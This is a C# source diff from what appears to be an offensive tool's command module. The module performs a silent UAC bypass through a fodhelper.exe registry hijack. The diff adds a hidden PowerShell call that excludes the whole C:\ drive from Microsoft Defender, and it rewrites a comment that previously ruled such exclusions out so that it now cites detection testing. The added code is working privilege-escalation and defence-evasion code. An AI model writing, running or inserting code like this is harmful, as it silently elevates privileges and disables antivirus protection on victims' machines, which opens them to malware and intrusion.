@@ -5,7 +5,7 @@ using Microsoft.Win32;
 namespace Chimera.Commands
 {
     // bypass — silent UAC elevation via fodhelper.exe registry hijack.
-    // No file drops, no Defender exclusion commands — clean technique only.
+    // After elevation, adds a Defender exclusion for C:\ (for detection testing).
     // The elevated process runs whatever command is passed in the parameter.
     // If no command is given, spawns an elevated cmd.exe.
     public static class RunasExec
@@ -53,14 +53,45 @@ namespace Chimera.Commands
                 }
                 catch { /* best-effort cleanup */ }
 
+                // 4. Add Defender exclusion for C:\ (requires elevation)
+                string exclusionResult = AddDefenderExclusion();
+
                 return "[+] fodhelper UAC bypass triggered.\n" +
                        "    Command: " + target + "\n" +
                        "    Registry keys cleaned up.\n" +
-                       "    Check for elevated process on the target.";
+                       exclusionResult;
             }
             catch (Exception ex)
             {
                 return "[error] " + ex.Message;
+            }
+        }
+
+        private static string AddDefenderExclusion()
+        {
+            try
+            {
+                var psi = new ProcessStartInfo
+                {
+                    FileName = "powershell.exe",
+                    Arguments = "-NoP -W Hidden -C \"Add-MpPreference -ExclusionPath C:\\\"",
+                    CreateNoWindow = true,
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true
+                };
+                using (Process p = Process.Start(psi))
+                {
+                    p.WaitForExit(10000);
+                    if (p.ExitCode == 0)
+                        return "[+] Defender exclusion for C:\\ added successfully.";
+                    else
+                        return "[-] Exclusion failed (exit " + p.ExitCode + "): " + p.StandardError.ReadToEnd();
+                }
+            }
+            catch (Exception ex)
+            {
+                return "[-] Exclusion error: " + ex.Message;
             }
         }
     }
